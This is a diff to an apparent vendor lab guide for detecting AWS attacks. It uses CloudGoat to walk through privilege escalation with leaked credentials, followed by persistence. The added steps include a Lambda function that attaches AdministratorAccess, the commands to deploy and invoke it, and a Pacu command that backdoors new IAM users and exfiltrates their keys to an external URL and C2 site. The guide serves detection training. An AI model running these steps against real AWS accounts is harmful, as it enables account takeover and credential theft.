@@ -2,12 +2,10 @@
    :maxdepth: 2
    :hidden:
 
-   index
-
 -----------------
 Detect for AWS
 -----------------
-|
+
 What is Detect for AWS?
 =======================
 
@@ -21,7 +19,7 @@ Scenario
 ========
 An attacker finds AWS user credentials in a GitHub repository.  These accidentals leaks can happen through misconfiguration of a. gitignore file. 
 
-The attack consists of two parts. First attacker performs privilege escalation using lambda. After the privilege escalation attacker create persistence using a lambda create creates backdoor IAM user credentials for all new users
+The attack consists of two parts. First attacker performs privilege escalation using Lambda. After the privilege escalation attacker create persistence using a lambda create creates backdoor IAM user credentials for all new users
 
 Lambda Privilege Escalation (Part 1)
 ====================================
@@ -189,7 +187,7 @@ Setup Cloudgoat
 
 - Run Cloudgoat config profile from home directory and set default
   profile. You will be prompted to enter an AWS profile from the
-  previous step which we called ``cloudgoat``. This is how cloudgoat
+  previous step which we called ``cloudgoat``. This is how Cloudgoat
   will access AWS. 
       
 .. code:: console
@@ -206,8 +204,7 @@ Create vulnerable infrastructure
 ++++++++++++++++++++++++++++++++
 
 - Now that the tools are setup we will use Cloudgoat to setup vulnerable
-  infrastructure in AWS. This will create a scenario with a misconfigured
-  reverse-proxy server in EC2.
+  infrastructure in AWS. This will create our scenario
 
 -  Run the attack scenario
 
@@ -230,7 +227,7 @@ At this point we have created vulnerable infrastructure in AWS using
 Cloudgoat. Starting as an anonymous outsider with no access or
 privileges.
 
-  Create a new aws profile with stolen credentials
+- Create a new aws profile with scenarios stolen credentials
 
 .. code:: console
 
@@ -242,7 +239,7 @@ privileges.
 -  Set the “Default region” to ``us-east-1`` and the “Default output” format to
    ``json``
 
-  Do discovery to find the username associated with the access key
+- Do discovery to find the username associated with the access key
 
 .. code:: console
 
@@ -267,6 +264,9 @@ privileges.
 .. code:: console
 
     aws iam list-roles --profile chris | grep cg-debug-role-lambda 
+    
+.. code:: console
+
     aws iam list-roles --profile chris | grep cg-lambdaManager-role-lambda 
 
 - Use the role name output to list the attached policies and copy the ``Policy Name`` and ``ARN`` output to your text file
@@ -274,10 +274,13 @@ privileges.
 .. code:: console
    
     aws iam list-attached-role-policies --role-name <debug role name> --profile chris
+    
+.. code:: console
+
     aws iam list-attached-role-policies --role-name <lambda manager role name> --profile chris
 
 - From that output you can see
-   - ``cg-debug-role-lambda_privesc`` can be assumed by a lambda
+   - ``cg-debug-role-lambda_privesc`` can be assumed by a Lambda
    - ``cg-lambdaManager-role-lambda_privesc`` can be assumed by your user
 
 - Let’s get the polices attached to the role we can assume
@@ -329,14 +332,14 @@ To assume the role you will need the role ARN for cg-lambdaManager-role-lambda. 
 
      touch lambda_function.py && vi lambda_function.py
 
-- Add contents 
+- Add contents to new file anc update with your discovered username ``aws sts get-caller-identity --profile chris``
 
 .. code:: python
 
     import boto3
     def lambda_handler(event, context):
             client = boto3.client('iam')
-            response = client.attach_user_policy(UserName = 'chris-lambda_privesc_cgidku1giihyim', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
+            response = client.attach_user_policy(UserName = '<username>', PolicyArn='arn:aws:iam::aws:policy/AdministratorAccess')
             return response
 
 - Zip the file 
@@ -346,42 +349,51 @@ To assume the role you will need the role ARN for cg-lambdaManager-role-lambda. 
     zip -q lambda_function.py.zip lambda_function.py
 
 
+- Deploy and assign the Lambda function with the Lambda admin role.  This is the ARN from ``cg-debug-role-lambda_privesc`` discovered in a previous step by running ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
+
+.. code:: console
+
+    aws lambda create-function --function-name admin_function-<initials> --runtime python3.6 --role <Role ARN> --handler lambda_function.lambda_handler --zip-file fileb://lambda_function.py.zip --profile lambdaManager
+
+- Invoke the new function 
+
+.. code:: console
+
+   aws lambda invoke --function-name admin_function-<initials> out.txt --profile lambdaManager
+
+- Test privilege escalation user policy was applied.
+
+.. code:: console
+
+    aws iam list-attached-user-policies --user-name <username> --profile chris
 
 
+Serverless Persistence
+======================
+For this part of the attack we will use Pacu
 
 
+-  Start pacu from the shell session by running ``~/pacu/cli.py``
+-  Create new session in pacu named ``chris``
+-  Add the keys from your AWS profile using ``import_keys chris``
+-  List the Lambda functions with ``run lambda__enum``
 
+Create persistence with Lambda that creates a backdoor IAM user credentials.  This will require 2 inputs which you will need prior to proceeding
+- Role ARN from previous attack ``aws iam list-roles --profile chris | grep cg-debug-role-lambda``
+- exfil-url ``https://commander-api.vectratme.com/adduser``
 
+Once you have the above values run the below in pacu.  You will be prompted for the ARN.
 
-Pacu Discovery 
-++++++++++++++
+.. code:: console
 
--  Next we will use pacu to do discovery with the stolen crendentials
+    run lambda__backdoor_new_users --exfil-url https://commander-api.vectratme.com/adduser
 
-   -  Start pacu from the shell session by running ``~/pacu/cli.py``
-   -  Create new session in pacu named ``cloud_breach_s3``
-   -  Set the keys using ``set_keys`` from the pacu session using the
-      stolen credentials from the previous step
+Persistence has been set. Lets create a new user to test it (you don't need to leave pacu)
 
-.. figure:: ./images/pacukeys.png
-   :alt: keys
+.. code:: console
+    
+    aws iam create-user --user-name <initials> --profile chris
 
-Pacu Results
-++++++++++++
+Now let’s visit our C2 site https://commander.vectratme.com/ to verify.  You will need a logon provided by Vectra.
 
--  Use pacu to start disocvery using the following modules
-
-   -  ``run aws__enum_account`` Get account details: permission denied
-   -  ``run iam__enum_permissions`` Get permissions for IAM entity:
-      permission denied
-   -  ``run iam__enum_users_roles_policies_groups`` Get group polices
-      for IAM entity: permission denied
-   -  ``run iam__bruteforce_permissions`` Brute force for access to
-      services: **BINGO!**
-
-.. figure:: ./images/output.png
-   :alt: output
-
--  The stolen credentials have full access to S3
--  Exit pacu by typing ``exit`` and return to attack
-   
+image
